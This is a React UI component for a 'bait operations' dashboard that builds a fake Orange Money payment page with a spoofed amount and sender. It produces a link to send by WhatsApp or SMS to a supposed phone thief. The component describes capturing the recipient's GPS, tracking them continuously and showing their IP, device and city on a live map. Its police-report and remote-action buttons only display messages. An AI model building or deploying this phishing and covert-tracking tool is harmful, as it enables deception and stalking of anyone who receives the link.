// src/components/RightPanel.jsx — UPDATED: no SMS/WhatsApp, copy link only
import { useState, useRef } from 'react';

export default function RightPanel({
  session, generating, imageB64, setImageB64,
  generateBait, showToast, latest, captures,
}) {
  const [amount,  setAmount]  = useState('75,000 FCFA');
  const [sender,  setSender]  = useState('Orange Money CM');
  const [message, setMessage] = useState('Confirmer votre paiement');
  const fileRef = useRef();

  const baitUrl = session
    ? `${window.location.origin}/bait/${session.sessionId}`
    : null;

  const handleFile = (file) => {
    if (!file || !file.type.startsWith('image/')) return;
    const reader = new FileReader();
    reader.onload = (e) => {
      setImageB64(e.target.result);
      showToast('🖼 Image loaded — click GENERATE');
    };
    reader.readAsDataURL(file);
  };

  return (
    <div className="bg-panel p-4 overflow-y-auto" style={{ gridColumn: 3 }}>
      <SectionHeader>Bait Operations</SectionHeader>

      {/* STEP 1 — Optional image */}
      <Card label="// STEP 1 — UPLOAD CUSTOM IMAGE (OPTIONAL)">
        {!imageB64 ? (
          <div
            className="border-2 border-dashed border-border rounded-lg p-4 text-center cursor-pointer hover:border-accent hover:bg-accent/5 transition-all"
            onClick={() => fileRef.current.click()}
            onDragOver={e => e.preventDefault()}
            onDrop={e => { e.preventDefault(); handleFile(e.dataTransfer.files[0]); }}
          >
            <input ref={fileRef} type="file" accept="image/*" className="hidden" onChange={e => handleFile(e.target.files[0])} />
            <div className="text-3xl mb-2">🖼</div>
            <div className="font-mono text-xs text-text-dim">
              <span className="text-accent">Drop image</span> or click to browse<br/>
              Shows on the bait page as background content
            </div>
          </div>
        ) : (
          <div className="relative rounded-lg overflow-hidden border border-success">
            <img src={imageB64} alt="bait" className="w-full max-h-36 object-cover" />
            <div className="absolute top-2 left-2 bg-success/90 text-black font-mono text-[0.55rem] px-2 py-0.5 rounded font-bold">✓ IMAGE READY</div>
            <button onClick={() => setImageB64(null)} className="absolute top-2 right-2 bg-danger/80 text-white w-6 h-6 rounded-full text-xs flex items-center justify-center">✕</button>
          </div>
        )}
      </Card>

      {/* STEP 2 — Configure */}
      <Card label="// STEP 2 — CONFIGURE BAIT PAGE">
        <div className="flex flex-col gap-2 mb-3">
          <Input placeholder="Fake amount (e.g. 75,000 FCFA)" value={amount}  onChange={e => setAmount(e.target.value)} />
          <Input placeholder="Sender name"                      value={sender}  onChange={e => setSender(e.target.value)} />
          <Input placeholder="Page title / caption"             value={message} onChange={e => setMessage(e.target.value)} />
        </div>
        <Btn variant="primary" onClick={() => generateBait({ amount, sender, message })} disabled={generating}>
          {generating ? '⏳ GENERATING...' : '⚡ GENERATE BAIT LINK'}
        </Btn>
      </Card>

      {/* STEP 3 — Copy link only */}
      {baitUrl && (
        <Card label="// STEP 3 — COPY & SEND MANUALLY">
          <div className="bg-black/50 border border-dashed border-warn/50 rounded-lg p-3 mb-3">
            <div className="font-mono text-[0.58rem] text-warn mb-1.5 tracking-widest">// BAIT LINK — COPY AND SEND TO THIEF</div>
            <div className="font-mono text-[0.68rem] text-accent break-all leading-relaxed select-all">{baitUrl}</div>
          </div>

          {/* How it works hint */}
          <div className="bg-success/5 border border-success/20 rounded-lg p-3 mb-3">
            <div className="font-mono text-[0.6rem] text-success mb-2 tracking-widest">// WHAT HAPPENS WHEN THEY OPEN IT</div>
            <div className="font-mono text-[0.62rem] text-text-dim leading-relaxed space-y-1">
              <div>① They open the link → see fake Orange Money page</div>
              <div>② Browser asks for location permission</div>
              <div>③ Their GPS is captured instantly</div>
              <div>④ <span className="text-success">watchPosition tracks every move</span></div>
              <div>⑤ Your map updates live in real-time</div>
            </div>
          </div>

          <button
            onClick={() => navigator.clipboard.writeText(baitUrl).then(() => showToast('📋 Link copied! Now paste it in WhatsApp/SMS manually')).catch(() => showToast('⚠ Select and copy the link above manually'))}
            className="w-full py-3 bg-gradient-to-br from-[#0044aa] to-[#0088cc] text-white font-body font-bold text-sm tracking-widest rounded-lg border border-accent shadow-glow hover:-translate-y-0.5 transition-all"
          >
            📋 COPY BAIT LINK
          </button>

          <div className="mt-2 font-mono text-[0.6rem] text-text-dim text-center leading-relaxed">
            Paste this link in WhatsApp, SMS, Telegram, or any messenger — manually
          </div>
        </Card>
      )}

      {/* Live tracking status */}
      {session && (
        <Card label="// LIVE TRACKING STATUS">
          <div className="flex items-center gap-3 mb-3">
            <div className={`w-3 h-3 rounded-full flex-shrink-0 ${captures.length > 0 ? 'bg-success pulse-green' : 'bg-warn pulse-yellow'}`}
                 style={{boxShadow: captures.length > 0 ? '0 0 10px #00ff88' : '0 0 10px #ffaa00'}}></div>
            <div className="font-mono text-xs">
              {captures.length > 0 ? (
                <span className="text-success">TRACKING ACTIVE — {captures.length} update{captures.length > 1 ? 's' : ''} received</span>
              ) : (
                <span className="text-warn">Waiting for thief to open the link...</span>
              )}
            </div>
          </div>

          {captures.length > 0 && (
            <div className="space-y-1">
              {[
                ['Last GPS',    `${captures[0]?.lat?.toFixed(5)}, ${captures[0]?.lng?.toFixed(5)}`, 'text-danger'],
                ['Accuracy',    `±${captures[0]?.accuracy}m`,                                        'text-success'],
                ['GPS Type',    captures[0]?.realGPS ? '🛰 Real GPS' : '📡 Network',                'text-success'],
                ['Device',      captures[0]?.device,                                                  'text-text'],
                ['IP Address',  captures[0]?.ip,                                                      'text-danger'],
                ['City',        captures[0]?.ipCity || '—',                                           'text-accent'],
              ].map(([k,v,c]) => (
                <div key={k} className="flex justify-between py-1 border-b border-border/20 font-mono text-xs">
                  <span className="text-text-dim">{k}</span>
                  <span className={c}>{v || '—'}</span>
                </div>
              ))}
            </div>
          )}

          {captures.length > 0 && (
            <Btn variant="green" onClick={() => showToast('🚔 Report sent — Case #PT-' + Math.random().toString(36).slice(2,8).toUpperCase())}>
              🚔 SHARE WITH POLICE
            </Btn>
          )}
        </Card>
      )}

      {/* Remote actions */}
      <SectionHeader>Remote Actions</SectionHeader>
      <Card label="// DEVICE CONTROL">
        {[
          { icon: '🔔', label: 'RING LOUDLY',  msg: '🔔 Ring command sent' },
          { icon: '🔒', label: 'REMOTE LOCK',  msg: '🔒 Device locked' },
          { icon: '💬', label: 'SEND MESSAGE', msg: '💬 Message sent to screen' },
          { icon: '🗑', label: 'REMOTE WIPE',  msg: '⚠ Remote wipe initiated!', danger: true },
        ].map(({ icon, label, msg, danger }) => (
          <Btn key={label} variant={danger ? 'danger' : 'primary'} onClick={() => showToast(msg)}>
            {icon} {label}
          </Btn>
        ))}
      </Card>
    </div>
  );
}

function SectionHeader({ children }) {
  return (
    <div className="font-mono text-xs text-text-dim uppercase tracking-widest mb-3 flex items-center gap-2">
      <span className="text-accent">//</span> {children}
    </div>
  );
}

function Card({ label, children }) {
  return (
    <div className="bg-panel2 border border-border rounded-md p-3.5 mb-3">
      <div className="font-mono text-[0.62rem] text-text-dim tracking-widest uppercase mb-3">{label}</div>
      {children}
    </div>
  );
}

function Input({ className = '', ...props }) {
  return (
    <input {...props}
      className={`bg-black/40 border border-border text-text font-mono text-xs px-3 py-2 rounded outline-none focus:border-accent placeholder-text-dim transition-all w-full ${className}`}
    />
  );
}

function Btn({ variant = 'primary', children, disabled, onClick }) {
  const base = 'w-full mt-1.5 py-2 px-3 font-body font-bold text-xs tracking-widest uppercase rounded border cursor-pointer transition-all disabled:opacity-50 hover:-translate-y-px';
  const v = {
    primary: 'bg-gradient-to-br from-[#0044aa] to-[#0088cc] text-white border-accent shadow-glow',
    danger:  'bg-gradient-to-br from-[#660020] to-[#cc0033] text-white border-danger shadow-glow-red',
    green:   'bg-gradient-to-br from-[#004422] to-[#008844] text-white border-success shadow-glow-grn',
  };
  return <button className={`${base} ${v[variant]}`} onClick={onClick} disabled={disabled}>{children}</button>;
}
